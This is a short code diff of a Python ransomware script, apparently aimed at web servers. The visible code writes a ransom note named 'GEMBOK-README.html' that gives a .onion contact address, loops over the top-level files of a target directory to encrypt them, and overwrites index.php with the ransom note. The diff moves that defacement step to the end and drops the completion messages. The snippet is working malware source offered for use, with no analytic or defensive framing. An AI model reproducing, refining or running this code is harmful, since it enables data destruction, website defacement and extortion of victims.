@@ -26,9 +26,6 @@ http://xb6q2aggycmlcrjtbjendcnnwpmmwbosqaugxsqbracujntika2us.onion/contact</p>
 with open(os.path.join(TARGET_DIR, "GEMBOK-README.html"), "w") as f:
     f.write(ransom_note)
 
-with open(os.path.join(TARGET_DIR, "index.php"), "w") as f:
-    f.write(ransom_note)
-
 # Encrypt ONLY files in the top level (no recursion)
 encrypted_count = 0
 for entry in os.listdir(TARGET_DIR):
@@ -60,5 +57,5 @@ for entry in os.listdir(TARGET_DIR):
     except Exception as e:
         print(f"[-] Failed on {entry}: {e}")
 
-print(f"\nDone! Encrypted {encrypted_count} top-level files in {TARGET_DIR}")
-print("Subfolders were NOT touched - check yourself :)")
+with open(os.path.join(TARGET_DIR, "index.php"), "w") as f:
+    f.write(ransom_note)
